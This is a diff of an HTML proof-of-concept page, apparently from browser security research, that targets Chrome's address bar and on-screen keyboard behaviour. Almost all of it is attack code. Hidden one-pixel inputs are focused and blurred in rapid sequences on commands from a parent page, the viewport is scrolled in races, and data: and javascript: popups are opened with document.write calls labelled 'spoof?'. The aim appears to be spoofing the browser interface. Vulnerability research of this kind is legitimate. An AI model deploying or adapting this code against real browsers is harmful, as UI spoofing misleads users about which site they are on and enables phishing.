@@ -1,48 +1,115 @@
 <!doctype html>
 <html>
 <head>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
 <style>
-#focusElem { opacity:0.01; width:1px; height:1px; }
+html,body{height:100%;margin:0;font-family:Arial}
+#focusElem{opacity:0.01;width:1px;height:1px;border:0;padding:0;margin:0}
+.info{padding:8px;font-size:13px;color:#222}
 </style>
 </head>
-
 <body>
+  <div class="info">
+    iframe PoC — has hidden small inputs. Use parent page to trigger strategies.
+  </div>
 
-<input id="focusElem">
+  <!-- Two hidden inputs to rapidly toggle IME -->
+  <input id="focusElem" autocomplete="off" />
+  <input id="focusElem2" autocomplete="off" style="opacity:0.01;position:fixed;left:-10px;top:0;width:1px;height:1px;border:0">
 
 <script>
-// STEP 1: Focus IME inside iframe (Chrome triggers bottom controls adjustment)
-function triggerIME() {
-    setTimeout(() => focusElem.focus(), 30);
+const f1 = document.getElementById('focusElem');
+const f2 = document.getElementById('focusElem2');
+
+function safeFocus(el) {
+  try { el.focus(); } catch(e) {}
 }
 
-// STEP 2: Replace IME animation with NON-IME animation
-// → This simulates Chrome's testAnimationReplacement()
-
-function triggerReplacementAnimation() {
-    // FORCE a layout shift (scroll animation)
-    document.body.style.height = "2000px";
-    window.scrollTo({ top: 500, behavior: "smooth" });
-
-    // Popup during IME animation → classic spoof vector
-    setTimeout(() => {
-        alert("Replacement animation running while IME active.\nCheck omnibox behavior.");
-    }, 50);
+// SHORT TIMING utility
+function quick(n, fn) {
+  setTimeout(fn, n);
 }
 
-// Listen message from parent
-window.addEventListener("message", (e) => {
-    if (e.data === "run-second-animation") {
-        triggerIME();                      // IME animation stage 1
-        setTimeout(triggerReplacementAnimation, 80); // animation replacement stage 2
-    }
-});
+// Strategy implementations triggered by postMessage from parent
+function strategy_focus_switch() {
+  // Focus sequence: f1 -> ask parent to focus -> f2 -> f1 quickly
+  safeFocus(f1);
+  window.parent.postMessage('focus-parent', '*');
+  quick(10, ()=> safeFocus(f2));
+  quick(20, ()=> safeFocus(f1));
+}
 
+function strategy_focus_blur_race() {
+  // Rapidly focus/blur to create show/hide IME sequences
+  safeFocus(f1);
+  quick(8, ()=> { try { f1.blur(); } catch(e){} });
+  quick(16, ()=> safeFocus(f2));
+  quick(24, ()=> { try { f2.blur(); } catch(e){} });
+  quick(32, ()=> safeFocus(f1));
+}
 
-// Auto-focus loop to keep IME visible
-setInterval(() => {
-    focusElem.focus();
-}, 150);
+function strategy_double_open_docwrite() {
+  // 1) open a data: URL (usually allowed)
+  // 2) very shortly after, open a javascript: URL or write into opened window
+  // This tries to create a navigation/commit replacement race.
+  try {
+    const win1 = window.open('data:text/html,<title>temp</title><body>tmp</body>', '_blank', 'width=400,height=300,top=10');
+    // slight delay then write / doc replace
+    quick(20, () => {
+      try {
+        // If win1 is same-origin (data: often treated as opaque) we'll attempt doc write
+        // If blocked, this will still attempt to create a second navigation quickly.
+        win1.document.open();
+        win1.document.write('<script>document.title="spoof?";</script><div>docwrite</div>');
+        win1.document.close();
+      } catch(e) {
+        // fallback: open a javascript: URL (may be blocked in some Chrome builds)
+        try {
+          window.open('javascript:document.write("X")', '_blank', 'width=400,height=300,top=10');
+        } catch(err) {}
+      }
+    });
+  } catch(e) {
+    // fallback attempt
+    try { window.open('javascript:alert("fallback")', '_blank'); } catch(_) {}
+  }
+}
+
+function strategy_visual_viewport_race() {
+  // Use visualViewport if available to cause rapid viewport resize events plus scroll
+  if (window.visualViewport) {
+    // trigger a series of small scrolls and height changes to the document to emulate keyboard-driven viewport changes
+    const origH = document.body.style.height || '';
+    document.body.style.height = '2000px';
+    // start small scroll
+    window.scrollTo(0, 200);
+    quick(12, ()=> window.scrollTo(0, 0));
+    quick(24, ()=> window.scrollTo(0, 300));
+    // also focus input mid-sequence
+    quick(8, ()=> safeFocus(f1));
+    quick(18, ()=> { try { f1.blur(); } catch(e){} });
+    quick(30, ()=> document.body.style.height = origH);
+  } else {
+    // fallback: just do fast focus/blur
+    strategy_focus_blur_race();
+  }
+}
+
+// Listen commands from parent
+window.addEventListener('message', (ev) => {
+  const cmd = ev.data;
+  if (!cmd) return;
+  if (cmd === 'focus-iframe-input') safeFocus(f1);
+  else if (cmd === 'blur-iframe-input') try { f1.blur(); } catch(e){}
+  else if (cmd === 'do-double-open') strategy_double_open_docwrite();
+  else if (cmd === 'visual-viewport-race') strategy_visual_viewport_race();
+  else if (cmd === 'run-all') {
+    strategy_focus_switch(); quick(40, strategy_double_open_docwrite); quick(80, strategy_visual_viewport_race);
+  }
+}, false);
+
+// Some autonomous aggressiveness: keep a gentle focus attempt but not too frequent
+let aggressiveInterval = setInterval(()=>{ try { f1.focus(); } catch(e){} }, 450);
 
 </script>
 </body>
